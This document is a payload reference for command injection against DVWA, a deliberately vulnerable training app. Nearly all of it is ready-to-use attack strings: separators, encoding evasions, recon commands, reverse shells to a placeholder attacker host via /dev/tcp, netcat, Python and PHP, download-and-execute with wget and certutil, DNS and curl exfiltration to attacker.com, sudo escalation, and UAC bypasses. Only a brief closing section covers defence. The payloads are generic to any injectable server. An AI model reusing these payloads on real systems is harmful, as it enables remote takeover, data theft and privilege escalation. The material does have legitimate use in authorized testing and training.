# DVWA Command Injection Exploitation: In-Depth Research Report

---

## 1. Vulnerability Mechanic (DVWA "exec" Module - Low Security)
- **Function:** The `ip` parameter in DVWA's command injection module is directly concatenated into a shell command (e.g., `system("ping -c 1 " . $ip)`) with no sanitization. The invoked shell is `/bin/sh` on Linux.
- **Environment:** Runs as Apache `www-data` on Debian with default PATH, in DVWA root directory. Hardcoded ping flag: `-c 1` (send 1 packet).
- **Exploitability:** Any shell metacharacter (`|`, `;`, `&&`, etc.) in `ip` will result in arbitrary command execution and output, leading to immediate RCE.

---

## 2. Operator/Separator Reference: Linux and Windows
| OS      | Operator  | Description     | Example Payload  |
|---------|-----------|----------------|-----------------|
| Linux   | `;`       | Chain; always  | `127.0.0.1; id` |
| Linux   | `&&`      | Chain if true  | `127.0.0.1 && id`|
| Linux   | `|`       | Pipe           | `127.0.0.1 | whoami`|
| Linux   | `$(...)`  | Substitution   | `127.0.0.1; echo $(id)`|
| Windows | `&`       | Chain; always  | `127.0.0.1 & whoami`|
| Windows | `&&`      | Chain if true  | `127.0.0.1 && whoami`|
| Windows | `|`       | Pipe           | `127.0.0.1 | findstr user`|
| Windows | `^`       | Escape         | `127.0.0.1 ^& whoami`|

---

## 3. Command Injection Evasion Techniques (POST Input)
- **Percent-Encoding:** `ip=127.0.0.1%3Bwhoami` (`%3B` = `;`)
- **Double Encoding:** `ip=127.0.0.1%253Bwhoami` (server decodes twice, yields `;`)
- **${IFS} substitution:** `ip=127.0.0.1;${IFS}id` (`${IFS}` is Bash's space)
- **Backslash escaping:** `ip=127.0.0.1\;id`
- **Base64-encoded via bash:** `ip=127.0.0.1;echo Y3VybCBodHRwOi8vZGVtbw==|base64 -d|bash`
- **Null byte injection:** `ip=127.0.0.1;whoami%00`
- **Shell comments:** `ip=127.0.0.1; id #`

---

## 4. Reconnaissance/Enumeration Payloads
| Recon   | Linux         | URL-Encoded   | Windows            | URL-Encoded     |
|---------|--------------|---------------|--------------------|-----------------|
| User    | ; whoami      | %3B%20whoami  | & whoami           | %26%20whoami    |
| IDs     | ; id          | %3B%20id      | & net user         | %26%20net%20user|
| Sysinfo | ; uname -a    | %3B%20uname%20-a| & systeminfo     | %26%20systeminfo|
| Host    | ; hostname    | %3B%20hostname| & hostname         | %26%20hostname  |
| Files   | ; ls -la      | %3B%20ls%20-la| & dir              | %26%20dir       |
| Env     | ; env         | %3B%20env     | & set              | %26%20set       |
| Network | ; ifconfig    | %3B%20ifconfig| & ipconfig /all    | %26%20ipconfig%20/all|

---

## 5. Advanced Reverse Shell/File Transfer Payloads
| Payload    | Linux Example                                                | Setup                        | Notes          |
|------------|-------------------------------------------------------------|------------------------------|----------------|
| Bash rev.  | ;bash -i >& /dev/tcp/ATTACKERIP/PORT 0>&1                   | nc -nvlp PORT                | Stealth, filter-prone |
| Python     | ;python -c 'import...;s.connect((IP,PORT));...'/bin/sh -i'  | nc -nvlp PORT                | Python req.    |
| PHP        | ;php -r '$sock=fsockopen("IP",PORT);.../bin/sh -i'         | nc -nvlp PORT                | PHP req.       |
| Netcat     | ;nc IP PORT -e /bin/sh                                      | nc -nvlp PORT                | nc req.        |
| wget/curl  | ;wget http://IP/file -O /tmp/file;chmod +x /tmp/file;/tmp/file| python3 -m http.server PORT | HTTP download  |
| Windows PS | & powershell -Command TCP socket shell (see details above)   | nc -nvlp PORT                | PS req.        |
| certutil   | & certutil -urlcache -split -f http://IP/f.exe f.exe & f.exe| Host HTTP server             | Windows native |

---

## 6. Blind/Time-based Injection / OOB Exfiltration
- **Sleep/Timeout:** `;sleep 5;` (Linux), `& timeout /t 5 &` (Windows)
- **Ping Delay:** `;ping -c 5 127.0.0.1` (Linux), `& ping -n 5 127.0.0.1 > nul &` (Windows)
- **DNS Exfil:** `;nslookup $(whoami).attacker.com;` (Linux), `& nslookup %USERNAME%.attacker.com &` (Windows)
- **HTTP Callback:** `;curl http://attacker/?data=$(id);` (Linux), `& curl http://attacker/?data=%USERNAME% &` (Windows)

---

## 7. Privilege Escalation Injection Payloads
| Type          | Linux Payload                            | Windows Payload                                                         |
|---------------|------------------------------------------|-------------------------------------------------------------------------|
| Sudo enum     | ; sudo -l                               | N/A                                                                    |
| Sudo shell    | ; sudo /bin/bash                        | N/A                                                                    |
| SUID search   | ; find / -perm -4000 -type f 2>/dev/null | N/A                                                                    |
| Kernel exploit| ; wget/curl exploit, chmod+x, run        | N/A                                                                    |
| UAC bypass    | N/A                                     | & reg add/ms-settings/fodhelper+start fodhelper.exe                     |
| UAC bypass    | N/A                                     | & reg add mscfile/shell/open/command d "cmd.exe" /f & eventvwr.exe      |

---

## 8. Reference Matrix (Unified View)

| OS      | Type            | Example Payload                                        | Encoded Variant              | Notes                  |
|---------|-----------------|-------------------------------------------------------|------------------------------|------------------------|
| Linux   | Operator        | ;id                                                   | %3B id                       | Chain and run `id`     |
| Linux   | Evasion         | ;${IFS}id                                            | %3B${IFS}id                  | Spaces via `${IFS}`    |
| Linux   | Recon           | ;uname -a                                            | %3B uname%20-a               | System info            |
| Linux   | Shell           | ;bash -i >& /dev/tcp/IP/PORT 0>&1                    | -                            | Reverse shell          |
| Linux   | Blind           | ;sleep 5;                                            | %3Bsleep%205%3B               | Timing-based detection |
| Linux   | Escalate        | ;sudo /bin/bash                                      | %3Bsudo%20/bin/bash           | Root shell if allowed  |
| Windows | Operator        | & whoami                                             | %26 whoami                    | Chain and run whoami   |
| Windows | Evasion         | & echo ^whoami                                       | %26 echo ^whoami              | Uses caret             |
| Windows | Recon           | & systeminfo                                         | %26 systeminfo                | System details         |
| Windows | Shell           | & powershell TCPClient rev shell (see above for full)| see above                     | Reverse shell          |
| Windows | Blind           | & ping -n 5 127.0.0.1 > nul &                        | %26 ping -n 5 127.0.0.1 > nul | Timed response        |
| Windows | Escalate        | & reg add...fodhelper... & start fodhelper.exe       | see above                     | UAC bypass             |

---

# Usage & Defensive Considerations
- **Critical:** All techniques above trivially lead to RCE in DVWA's exec (low) context. Exploiting this in production could fully compromise the web server.
- **Abuse Prevention:** Use safe APIs (never `system`, `exec`, etc. with untrusted input), enforce strict input validation, employ allowlists for OS commands, and run with least privilege.
- **Detection:** Monitor web logs for suspicious payload patterns, inspect decoded inputs, and alert on unexpected outbound connections.

---

This report is ready for advanced penetration test operations, red teaming, and blue team defense preparation. All payloads should only be used in authorized, legal scenarios.
